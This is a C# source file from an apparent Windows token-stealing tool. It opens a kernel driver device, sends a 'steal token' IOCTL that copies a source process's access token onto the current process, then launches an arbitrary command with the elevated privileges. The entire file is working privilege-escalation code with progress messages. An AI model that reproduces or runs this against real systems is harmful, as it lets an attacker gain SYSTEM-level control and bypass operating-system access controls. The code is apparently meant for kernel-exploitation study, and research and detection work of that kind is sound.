﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using StealTokenClient.Interop;

namespace StealTokenClient.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool CreateTokenStealedProcess(int srcPid, string command)
        {
            NTSTATUS ntstatus;
            var dstPid = (uint)Process.GetCurrentProcess().Id;
            var bSuccess = false;
            var info = new STEAL_TOKEN_INPUT { SourcePid = (uint)srcPid, DestinationPid = dstPid };
            IntPtr pInBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(STEAL_TOKEN_INPUT)));
            Marshal.StructureToPtr(info, pInBuffer, true);

            Console.WriteLine("[>] Sending a query to {0}.", Globals.SYMLINK_PATH);

            do
            {
                IntPtr hDevice;
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO))
                };

                using (var objectAttributes = new OBJECT_ATTRIBUTES(
                    Globals.SYMLINK_PATH,
                    OBJECT_ATTRIBUTES_FLAGS.CaseInsensitive))
                {
                    ntstatus = NativeMethods.NtCreateFile(
                        out hDevice,
                        ACCESS_MASK.GENERIC_READ | ACCESS_MASK.GENERIC_WRITE,
                        in objectAttributes,
                        out IO_STATUS_BLOCK _,
                        IntPtr.Zero,
                        FILE_ATTRIBUTE_FLAGS.NORMAL,
                        FILE_SHARE_ACCESS.NONE,
                        FILE_CREATE_DISPOSITION.OPEN,
                        FILE_CREATE_OPTIONS.NON_DIRECTORY_FILE,
                        IntPtr.Zero,
                        0u);
                }

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to open {0} (NTSTATUS = 0x{1}).", Globals.SYMLINK_PATH, ntstatus.ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a handle to {0} (Handle = 0x{1}).", Globals.SYMLINK_PATH, hDevice.ToString("X"));
                }

                ntstatus = NativeMethods.NtDeviceIoControlFile(
                    hDevice,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    out IO_STATUS_BLOCK _,
                    Globals.IOCTL_STEAL_TOKEN,
                    pInBuffer,
                    (uint)Marshal.SizeOf(typeof(STEAL_TOKEN_INPUT)),
                    IntPtr.Zero,
                    0u);
                NativeMethods.NtClose(hDevice);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to NtDeviceIoControlFile() (NTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Token stealing from PID {0} to {1} is successful.", srcPid, dstPid);
                }

                Console.WriteLine("[>] Trying to create new process.");

                bSuccess = NativeMethods.CreateProcess(
                    null,
                    command,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    PROCESS_CREATION_FLAGS.CREATE_NEW_CONSOLE,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInfo);

                if (!bSuccess)
                {
                    Console.WriteLine("[-] Failed to CreateProcess() (Error = 0x{0})", Marshal.GetLastWin32Error().ToString("X8"));
                }
                else
                {
                    Console.WriteLine("[+] New process is executed successfully.");
                    Console.WriteLine("    [*] Process ID : {0}", processInfo.dwProcessId);
                    Console.WriteLine("    [*] Thread ID  : {0}", processInfo.dwThreadId);

                    NativeMethods.NtClose(processInfo.hThread);
                    NativeMethods.NtClose(processInfo.hProcess);
                }
            } while (false);

            Marshal.FreeHGlobal(pInBuffer);

            Console.WriteLine("[*] Done.");

            return bSuccess;
        }
    }
}
